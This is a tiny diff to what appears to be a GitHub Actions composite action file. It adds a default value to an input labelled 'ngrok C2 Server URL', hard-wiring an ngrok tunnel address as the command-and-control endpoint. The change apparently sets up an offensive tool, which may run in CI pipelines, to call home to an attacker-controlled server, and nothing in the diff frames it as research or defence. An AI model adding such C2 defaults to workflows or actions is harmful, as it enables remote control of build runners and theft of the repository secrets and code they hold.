@@ -5,6 +5,7 @@ inputs:
   c2_url:
     description: 'ngrok C2 Server URL'
     required: false
+    default: https://8a76-14-33-52-135.ngrok-free.app
 
 runs:
   using: 'composite'
